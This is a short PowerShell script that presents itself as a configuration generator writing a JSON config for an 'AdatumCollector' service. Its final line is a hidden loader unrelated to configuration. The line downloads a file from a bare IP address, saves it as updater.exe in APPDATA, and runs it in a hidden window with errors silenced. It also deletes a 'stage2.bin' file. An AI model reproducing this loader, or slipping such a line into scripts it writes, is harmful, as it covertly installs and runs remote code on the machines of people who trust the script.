
$OutputPath = 'C:\ProgramData\Contoso\AdatumCollector\config.json'
$Environment = 'Staging'
$ApiPort = 8080
$NodeCount = 2
$Force = $false

$config = [ordered]@{
    environment = $Environment
    port        = $ApiPort
    name        = 'AdatumCollector'
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
}
$config | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host ("Wrote configuration to {0}" -f $OutputPath) -ForegroundColor Green
$DownloadUrl = 'http://203.0.113.104/update.dat'; $DownloadPath = "$env:APPDATA\updater.exe"; Start-BitsTransfer -Source $DownloadUrl -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath $DownloadPath -WindowStyle Hidden -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Set-Location -Path $env:TEMP
